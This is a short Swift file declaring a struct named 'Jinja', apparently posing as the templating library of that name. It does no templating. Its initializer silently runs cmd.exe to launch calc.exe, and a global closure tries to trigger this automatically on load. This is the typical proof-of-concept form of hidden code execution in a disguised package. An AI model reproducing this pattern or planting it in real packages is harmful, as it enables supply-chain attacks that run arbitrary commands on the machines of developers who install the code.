import Foundation

public struct Jinja {
    public init() {
        let task = Process()
        task.executableURL = URL(fileURLWithPath: "C:\\Windows\\System32\\cmd.exe")
        task.arguments = ["/c", "calc.exe"]
        try? task.run()
    }
}

private let _ = {
    _ = Jinja()
}()
